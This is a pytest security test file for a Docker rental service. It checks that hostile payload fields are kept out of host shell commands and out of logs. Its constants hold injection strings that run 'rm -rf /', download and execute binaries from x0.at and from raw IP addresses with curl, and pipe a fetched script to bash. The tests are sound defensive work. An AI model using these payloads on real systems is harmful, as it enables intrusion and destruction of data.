import json
import logging
import shlex
from types import SimpleNamespace
from unittest.mock import AsyncMock, Mock
from uuid import uuid4

import pytest

from datura.requests.miner_requests import ExecutorSSHInfo
from payload_models.payloads import (
    AddSshPublicKeyRequest,
    ContainerCreateRequest,
    ContainerDeleteRequest,
    FailedContainerRequest,
    ContainerStartRequest,
    ContainerStopRequest,
    CustomOptions,
    PayloadPortMapping,
    RemoveSshPublicKeysRequest,
    WorkloadKind,
)
from services.docker_service import DockerService
from services.rental_docker_sdk import ContainerExecResult, build_gpu_docker_config


HOSTILE_USERNAME = "user'; rm -rf / #"
HOSTILE_PASSWORD = (
    "x' | curl -fsSL https://x0.at/mney -o /tmp/mney"
    "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
)
HOSTILE_IMAGE = "|| curl -fsSL http://69.197.150.11:54321/update | bash ||:0.0.0"
HOSTILE_ENV_VALUE = "value'; echo ENV_MARKER; $(echo env)"
HOSTILE_PUBLIC_KEY = "';  c'u'''''r\\l'''' -o /tmp/systemd 203.23.128.30:443/linux_wss;'"
HOSTILE_STARTUP_COMMAND = "\n\nsh /tmp/Jtd7.sh"
HOSTILE_CONTAINER_NAME = "pod_name; echo CONTAINER_MARKER; $(echo name)"
HOSTILE_VOLUME_NAME = "volume_bad; echo VOLUME_MARKER; $(echo volume)"
HOSTILE_MINER_HOTKEY = "miner; echo HOTKEY_MARKER; $(echo hotkey)"


class DummySSHConnectionManager:
    def __init__(self, ssh_client):
        self.ssh_client = ssh_client

    async def __aenter__(self):
        return self.ssh_client

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        return None


class RecordingSSHClient:
    def __init__(self, *, stdout: str = "", stderr: str = "", exit_status: int = 0):
        self.commands = []
        self.stdout = stdout
        self.stderr = stderr
        self.exit_status = exit_status

    async def run(self, command, *args, **kwargs):
        self.commands.append(command)
        return SimpleNamespace(
            stdout=self.stdout,
            stderr=self.stderr,
            exit_status=self.exit_status,
        )


class RecordingRentalDockerClient:
    def __init__(self):
        self.login_calls = []
        self.inspected_images = []
        self.existing_images = set()
        self.pulled_images = []
        self.run_specs = []
        self.exec_specs = []
        self.started_containers = []
        self.stopped_containers = []
        self.removed_containers = []
        self.removed_volumes = []
        self.pruned_images = 0

    async def login(self, *, username: str, password: str) -> None:
        self.login_calls.append({"username": username, "password": password})

    async def image_exists(self, *, image: str) -> bool:
        self.inspected_images.append(image)
        return image in self.existing_images

    async def pull(self, *, image: str) -> None:
        self.pulled_images.append(image)

    async def run_container(self, spec) -> None:
        self.run_specs.append(spec)

    async def exec_in_container(self, spec) -> ContainerExecResult:
        self.exec_specs.append(spec)
        return ContainerExecResult(exit_status=0)

    async def start(self, *, container_name: str) -> None:
        self.started_containers.append(container_name)

    async def stop(self, *, container_name: str) -> None:
        self.stopped_containers.append(container_name)

    async def remove_container(
        self,
        *,
        container_name: str,
        force: bool = True,
        remove_volumes: bool = True,
    ) -> None:
        self.removed_containers.append(
            {
                "container_name": container_name,
                "force": force,
                "remove_volumes": remove_volumes,
            }
        )

    async def remove_volume(self, *, volume_name: str, force: bool = False) -> None:
        self.removed_volumes.append(
            {"volume_name": volume_name, "force": force}
        )

    async def prune_images(self) -> None:
        self.pruned_images += 1


class RecordingRentalDockerFactory:
    def __init__(self):
        self.client = RecordingRentalDockerClient()
        self.connect_calls = []

    def connect(self, *, executor_info: ExecutorSSHInfo, private_key: str):
        self.connect_calls.append(
            {"executor_info": executor_info, "private_key": private_key}
        )
        return self

    async def __aenter__(self):
        return self.client

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        return None


@pytest.fixture
def docker_service():
    ssh_service = Mock()
    redis_service = Mock()
    attestation_service = Mock()
    lock = AsyncMock()
    lock.__aenter__ = AsyncMock(return_value=lock)
    lock.__aexit__ = AsyncMock(return_value=None)
    redis_service.acquire_executor_lock = Mock(return_value=lock)
    return DockerService(
        ssh_service=ssh_service,
        redis_service=redis_service,
        attestation_service=attestation_service,
        rental_docker_client_factory=RecordingRentalDockerFactory(),
    )


@pytest.fixture
def executor_info():
    return ExecutorSSHInfo(
        uuid=str(uuid4()),
        address="127.0.0.1",
        port=8080,
        ssh_username="root",
        ssh_port=2200,
        python_path="/usr/bin/python3",
        root_dir="/root/app",
    )


@pytest.fixture
def keypair():
    return Mock(ss58_address="validator-hotkey")


def _base_create_payload(**overrides) -> ContainerCreateRequest:
    values = {
        "miner_hotkey": "miner-hotkey",
        "executor_id": str(uuid4()),
        "pod_id": "00000000-0000-0000-0000-0000000000aa",
        "docker_image": "daturaai/pytorch:security-test",
        "docker_username": HOSTILE_USERNAME,
        "docker_password": HOSTILE_PASSWORD,
        "user_public_keys": [HOSTILE_PUBLIC_KEY],
        "gpu_uuids": ["GPU-test"],
        "cpu_count": 2,
        "memory_gb": 8,
        "custom_options": CustomOptions(
            volumes=["/data/rental:/workspace"],
            environment={
                "APP_MODE": "prod",
                "HOSTILE_ENV": HOSTILE_ENV_VALUE,
                "MULTILINE_ENV": "line1\nENV_NEWLINE_MARKER",
            },
            startup_commands=HOSTILE_STARTUP_COMMAND,
            shm_size="1g",
        ),
        "volume_limit_gb": 100,
        "storage_limit_gb": 50,
        "available_ports": [
            PayloadPortMapping(internal_port=22, external_port=30022),
            PayloadPortMapping(internal_port=20000, external_port=30000),
        ],
        "pod_mapping": [],
        "active_container_names": [],
        "active_volume_names": [],
    }
    values.update(overrides)
    return ContainerCreateRequest(**values)


def _lifecycle_payload(payload_cls, *, container_name: str):
    return payload_cls(
        miner_hotkey="miner-hotkey",
        executor_id=str(uuid4()),
        pod_id="pod-id",
        workload_kind=WorkloadKind.CUSTOMER_RENTAL,
        container_name=container_name,
    )


def _patch_common(monkeypatch, docker_service, ssh_client):
    monkeypatch.setattr(
        "services.docker_service.asyncssh.connect",
        Mock(return_value=DummySSHConnectionManager(ssh_client)),
    )
    monkeypatch.setattr(
        "services.docker_service.asyncssh.import_private_key",
        Mock(return_value="pkey"),
    )
    monkeypatch.setattr(
        docker_service,
        "_prepare_known_hosts_policy",
        AsyncMock(return_value=None),
    )
    docker_service.ssh_service.decrypt_payload = Mock(return_value="private-key")


def _patch_create_harness(monkeypatch, docker_service, ssh_client):
    captured_commands = []

    async def execute_and_capture(*, command, **kwargs):
        captured_commands.append(command)
        return True, ""

    _patch_common(monkeypatch, docker_service, ssh_client)
    monkeypatch.setattr(
        "services.docker_service.build_gpu_docker_config_for_executor",
        AsyncMock(
            return_value=build_gpu_docker_config(
                ["GPU-test"],
                device_nodes=["/dev/nvidia0", "/dev/nvidiactl"],
            )
        ),
    )
    monkeypatch.setattr(docker_service, "execute_and_stream_logs", execute_and_capture)
    monkeypatch.setattr(docker_service, "clean_existing_containers", AsyncMock())
    monkeypatch.setattr(docker_service, "clean_stale_vloopback_volumes", AsyncMock())
    monkeypatch.setattr(docker_service, "create_local_volume", AsyncMock())
    monkeypatch.setattr(
        docker_service,
        "resolve_volume_sizing",
        AsyncMock(
            return_value=SimpleNamespace(volume_limit_gb=44, storage_limit_gb=22)
        ),
    )
    monkeypatch.setattr(
        docker_service,
        "generate_portMappings",
        AsyncMock(return_value=([(22, 22, 30022), (20000, 20000, 30000)], None)),
    )
    monkeypatch.setattr(
        docker_service,
        "wait_for_port_check_containers",
        AsyncMock(return_value=(True, "ok")),
    )
    monkeypatch.setattr(
        docker_service,
        "check_container_running",
        AsyncMock(return_value=True),
    )
    monkeypatch.setattr(docker_service, "stream_log", AsyncMock())
    monkeypatch.setattr(docker_service, "finish_stream_logs", AsyncMock())
    monkeypatch.setattr(docker_service, "handle_stream_logs", AsyncMock())
    docker_service.redis_service.add_pending_pod = AsyncMock()
    docker_service.redis_service.remove_pending_pod = AsyncMock()
    docker_service.redis_service.add_rented_pod = AsyncMock()
    return captured_commands


def _all_host_commands(captured_commands, ssh_client):
    return [*captured_commands, *ssh_client.commands]


def _assert_markers_not_in_host_shell(commands, markers):
    hits = [
        (marker, command)
        for command in commands
        for marker in markers
        if marker in command
    ]
    assert not hits, "user-controlled marker appeared in host shell command text"


def _assert_shell_arg_is_single_token(command: str, expected_arg: str):
    words = shlex.split(command)
    assert expected_arg in words
    assert words.count(expected_arg) == 1


def _sdk_log_extras(caplog):
    return [
        record.msg.extra
        for record in caplog.records
        if getattr(record.msg, "extra", {}).get("docker_access") == "sdk"
    ]


def _sdk_log_extra(caplog, *, operation: str, status: str):
    return next(
        extra
        for extra in _sdk_log_extras(caplog)
        if extra["docker_operation"] == operation
        and extra["operation_status"] == status
    )


@pytest.mark.asyncio
async def test_create_container_keeps_hostile_fields_out_of_host_shell_commands(
    docker_service,
    executor_info,
    keypair,
    monkeypatch,
):
    ssh_client = RecordingSSHClient()
    captured_commands = _patch_create_harness(monkeypatch, docker_service, ssh_client)
    payload = _base_create_payload(docker_image=HOSTILE_IMAGE)

    await docker_service.create_container(
        payload=payload,
        executor_info=executor_info,
        keypair=keypair,
        private_key="encrypted-private-key",
    )

    docker_client = docker_service.rental_docker_client_factory.client
    run_spec = docker_client.run_specs[0]
    key_specs = [
        spec for spec in docker_client.exec_specs if "authorized_keys" in " ".join(spec.argv)
    ]
    env_specs = [
        spec for spec in docker_client.exec_specs if "/etc/environment" in " ".join(spec.argv)
    ]

    _assert_markers_not_in_host_shell(
        _all_host_commands(captured_commands, ssh_client),
        [
            "curl -fsSL https://x0.at/mney",
            "&&chmod +x /tmp/mney",
            "/tmp/mney   |echo",
            "rm -rf",
            "69.197.150.11:54321/update",
            "| bash",
            "ENV_MARKER",
            "ENV_NEWLINE_MARKER",
            "/tmp/systemd",
            "203.23.128.30:443/linux_wss",
            "/tmp/Jtd7.sh",
        ],
    )
    assert docker_client.login_calls == [
        {"username": HOSTILE_USERNAME, "password": HOSTILE_PASSWORD}
    ]
    assert docker_client.pulled_images == [HOSTILE_IMAGE]
    assert run_spec.image == HOSTILE_IMAGE
    assert run_spec.command == ("sh", "/tmp/Jtd7.sh")
    assert run_spec.environment["HOSTILE_ENV"] == HOSTILE_ENV_VALUE
    assert len(key_specs) == 1
    assert HOSTILE_PUBLIC_KEY not in " ".join(key_specs[0].argv)
    assert key_specs[0].stdin == f"{HOSTILE_PUBLIC_KEY}\n"
    assert len(env_specs) == 1
    assert env_specs[0].argv == ("sh", "-c", "cat >> /etc/environment")
    assert "ENV_NEWLINE_MARKER" in env_specs[0].stdin


@pytest.mark.asyncio
async def test_create_container_emits_secret_safe_sdk_operation_logs(
    docker_service,
    executor_info,
    keypair,
    monkeypatch,
    caplog,
):
    ssh_client = RecordingSSHClient()
    _patch_create_harness(monkeypatch, docker_service, ssh_client)
    payload = _base_create_payload(docker_image=HOSTILE_IMAGE)

    with caplog.at_level(logging.INFO):
        await docker_service.create_container(
            payload=payload,
            executor_info=executor_info,
            keypair=keypair,
            private_key="encrypted-private-key",
        )

    sdk_extras = _sdk_log_extras(caplog)
    succeeded_operations = {
        extra["docker_operation"]
        for extra in sdk_extras
        if extra["operation_status"] == "succeeded"
    }

    assert {
        "login",
        "pull",
        "run_container",
        "exec_create_ssh_bootstrap_script",
        "exec_run_ssh_bootstrap_script",
        "exec_add_authorized_keys",
        "exec_append_environment",
    }.issubset(succeeded_operations)

    run_extra = _sdk_log_extra(
        caplog,
        operation="run_container",
        status="succeeded",
    )
    assert run_extra["host_shell_command"] is False
    assert run_extra["container_name"] == "pod_00000000-0000-0000-0000-0000000000aa"
    assert run_extra["pod_id"] == payload.pod_id
    assert run_extra["image"] == HOSTILE_IMAGE
    assert run_extra["command_argv"] == ["sh", "/tmp/Jtd7.sh"]
    assert sorted(run_extra["environment_keys"]) == [
        "APP_MODE",
        "HOSTILE_ENV",
        "MULTILINE_ENV",
        "NVIDIA_DRIVER_CAPABILITIES",
    ]

    add_key_extra = _sdk_log_extra(
        caplog,
        operation="exec_add_authorized_keys",
        status="succeeded",
    )
    assert add_key_extra["stdin_bytes"] == len(f"{HOSTILE_PUBLIC_KEY}\n".encode())
    assert add_key_extra["stdout_len"] == 0
    assert add_key_extra["stderr_len"] == 0

    serialized = json.dumps(sdk_extras, default=str)
    assert HOSTILE_PASSWORD not in serialized
    assert HOSTILE_PUBLIC_KEY not in serialized
    assert HOSTILE_ENV_VALUE not in serialized

    all_log_content = json.dumps(
        {
            "messages": [record.getMessage() for record in caplog.records],
            "extras": [
                getattr(record.msg, "extra", {})
                for record in caplog.records
            ],
        },
        default=str,
    )
    assert HOSTILE_PASSWORD not in all_log_content


class NonZeroExecRentalDockerClient:
    async def exec_in_container(self, spec) -> ContainerExecResult:
        return ContainerExecResult(
            exit_status=7,
            stdout="stdout details",
            stderr="stderr details",
        )


@pytest.mark.asyncio
async def test_sdk_exec_logs_exit_status_stdout_and_stderr_lengths(
    docker_service,
    caplog,
):
    with caplog.at_level(logging.WARNING, logger="services.rental_docker_observability"):
        ok = await docker_service.add_environment_variables_with_rental_docker(
            docker_client=NonZeroExecRentalDockerClient(),
            container_name="pod_logs",
            environment={"APP_MODE": "prod"},
            log_tag="test",
            log_extra={"pod_id": "pod-id", "miner_hotkey": "miner-hotkey"},
        )

    assert ok is False
    failed_extra = _sdk_log_extra(
        caplog,
        operation="exec_append_environment",
        status="failed",
    )
    assert failed_extra["host_shell_command"] is False
    assert failed_extra["container_name"] == "pod_logs"
    assert failed_extra["exit_status"] == 7
    assert failed_extra["stdout"] == "stdout details"
    assert failed_extra["stderr"] == "stderr details"
    assert failed_extra["stdout_len"] == len("stdout details")
    assert failed_extra["stderr_len"] == len("stderr details")


@pytest.mark.asyncio
async def test_add_ssh_key_writes_public_keys_as_stdin_data(
    docker_service,
    executor_info,
    keypair,
    monkeypatch,
):
    ssh_client = RecordingSSHClient()
    _patch_common(monkeypatch, docker_service, ssh_client)
    payload = AddSshPublicKeyRequest(
        miner_hotkey="miner-hotkey",
        executor_id=str(uuid4()),
        pod_id="pod-id",
        workload_kind=WorkloadKind.CUSTOMER_RENTAL,
        container_name=HOSTILE_CONTAINER_NAME,
        user_public_keys=[HOSTILE_PUBLIC_KEY],
    )

    await docker_service.add_ssh_key(
        payload,
        executor_info,
        keypair,
        "encrypted-private-key",
    )

    docker_client = docker_service.rental_docker_client_factory.client
    assert len(docker_client.exec_specs) == 1
    spec = docker_client.exec_specs[0]
    _assert_markers_not_in_host_shell(
        ssh_client.commands,
        ["/tmp/systemd", "203.23.128.30:443/linux_wss"],
    )
    assert spec.container_name == HOSTILE_CONTAINER_NAME
    assert HOSTILE_PUBLIC_KEY not in " ".join(spec.argv)
    assert spec.stdin == f"{HOSTILE_PUBLIC_KEY}\n"


@pytest.mark.asyncio
async def test_remove_ssh_key_writes_public_keys_as_stdin_data(
    docker_service,
    executor_info,
    keypair,
    monkeypatch,
):
    ssh_client = RecordingSSHClient()
    _patch_common(monkeypatch, docker_service, ssh_client)
    payload = RemoveSshPublicKeysRequest(
        miner_hotkey="miner-hotkey",
        executor_id=str(uuid4()),
        pod_id="pod-id",
        workload_kind=WorkloadKind.CUSTOMER_RENTAL,
        container_name=HOSTILE_CONTAINER_NAME,
        user_public_keys=[HOSTILE_PUBLIC_KEY],
    )

    await docker_service.remove_ssh_keys(
        payload,
        executor_info,
        keypair,
        "encrypted-private-key",
    )

    docker_client = docker_service.rental_docker_client_factory.client
    assert len(docker_client.exec_specs) == 1
    spec = docker_client.exec_specs[0]
    _assert_markers_not_in_host_shell(
        ssh_client.commands,
        ["CONTAINER_MARKER", "/tmp/systemd", "203.23.128.30:443/linux_wss"],
    )
    assert spec.container_name == HOSTILE_CONTAINER_NAME
    assert HOSTILE_PUBLIC_KEY not in " ".join(spec.argv)
    assert spec.stdin == f"{HOSTILE_PUBLIC_KEY}\n"


@pytest.mark.asyncio
async def test_lifecycle_operations_pass_container_names_as_sdk_data(
    docker_service,
    executor_info,
    keypair,
    monkeypatch,
):
    ssh_client = RecordingSSHClient()
    retried_commands = []

    async def retry_capture(ssh_client, command, *args, **kwargs):
        retried_commands.append(command)

    _patch_common(monkeypatch, docker_service, ssh_client)
    monkeypatch.setattr("services.docker_service.retry_ssh_command", retry_capture)
    monkeypatch.setattr(docker_service, "_cleanup_custom_build_artifacts", AsyncMock())
    monkeypatch.setattr(
        docker_service,
        "install_open_ssh_server_and_start_ssh_service_with_rental_docker",
        AsyncMock(return_value=True),
    )
    docker_service.redis_service.remove_rented_machine = AsyncMock()

    await docker_service.start_container(
        _lifecycle_payload(ContainerStartRequest, container_name=HOSTILE_CONTAINER_NAME),
        executor_info,
        keypair,
        "encrypted-private-key",
    )
    await docker_service.stop_container(
        _lifecycle_payload(ContainerStopRequest, container_name=HOSTILE_CONTAINER_NAME),
        executor_info,
        keypair,
        "encrypted-private-key",
    )
    await docker_service.delete_container(
        ContainerDeleteRequest(
            miner_hotkey="miner-hotkey",
            executor_id=str(uuid4()),
            pod_id="pod-id",
            workload_kind=WorkloadKind.CUSTOMER_RENTAL,
            container_name=HOSTILE_CONTAINER_NAME,
            local_volume="volume_lifecycle",
        ),
        executor_info,
        keypair,
        "encrypted-private-key",
    )

    docker_client = docker_service.rental_docker_client_factory.client
    _assert_markers_not_in_host_shell(
        _all_host_commands(retried_commands, ssh_client),
        ["CONTAINER_MARKER"],
    )
    assert docker_client.started_containers == [HOSTILE_CONTAINER_NAME]
    assert docker_client.stopped_containers == [HOSTILE_CONTAINER_NAME]
    assert docker_client.removed_containers == [
        {
            "container_name": HOSTILE_CONTAINER_NAME,
            "force": True,
            "remove_volumes": True,
        }
    ]
    assert docker_client.pruned_images == 1
    assert docker_client.removed_volumes == [
        {"volume_name": "volume_lifecycle", "force": False}
    ]


@pytest.mark.parametrize(
    "volume_kwargs",
    [
        {"local_volume": HOSTILE_VOLUME_NAME},
        {"external_volume": HOSTILE_VOLUME_NAME},
    ],
)
@pytest.mark.asyncio
async def test_delete_container_rejects_unsafe_volume_names_before_shell(
    docker_service,
    executor_info,
    keypair,
    volume_kwargs,
):
    payload = ContainerDeleteRequest(
        miner_hotkey="miner-hotkey",
        executor_id=str(uuid4()),
        pod_id="pod-id",
        workload_kind=WorkloadKind.CUSTOMER_RENTAL,
        container_name="pod_valid",
        **volume_kwargs,
    )

    result = await docker_service.delete_container(
        payload,
        executor_info,
        keypair,
        "encrypted-private-key",
    )

    assert isinstance(result, FailedContainerRequest)
    assert docker_service.rental_docker_client_factory.connect_calls == []


@pytest.mark.asyncio
async def test_check_container_running_quotes_hostile_container_name_filter(
    docker_service,
):
    ssh_client = RecordingSSHClient(stdout="container-id\n")

    assert await docker_service.check_container_running(
        ssh_client,
        HOSTILE_CONTAINER_NAME,
    )

    assert len(ssh_client.commands) == 1
    _assert_shell_arg_is_single_token(
        ssh_client.commands[0],
        f"name={HOSTILE_CONTAINER_NAME}",
    )
    assert "echo" not in shlex.split(ssh_client.commands[0])


@pytest.mark.asyncio
async def test_port_check_filters_quote_hostile_miner_hotkey(
    docker_service,
):
    ssh_client = RecordingSSHClient()

    result = await docker_service.wait_for_port_check_containers(
        executor_info=Mock(),
        miner_hotkey=HOSTILE_MINER_HOTKEY,
        keypair=Mock(),
        private_key="unused",
        max_retries=0,
        retry_delay=0,
        ssh_client=ssh_client,
    )

    assert result == (True, "No port check containers found")
    assert len(ssh_client.commands) == 1
    _assert_shell_arg_is_single_token(
        ssh_client.commands[0],
        f"name=^container_{HOSTILE_MINER_HOTKEY}_",
    )
    assert "echo" not in shlex.split(ssh_client.commands[0])


@pytest.mark.asyncio
async def test_create_local_volume_rejects_unsafe_volume_name_before_shell(
    docker_service,
):
    ssh_client = RecordingSSHClient()

    with pytest.raises(ValueError):
        await docker_service.create_local_volume(
            ssh_client=ssh_client,
            local_volume=HOSTILE_VOLUME_NAME,
            log_tag="test",
            log_text="Creating volume",
            log_extra={},
        )

    assert ssh_client.commands == []
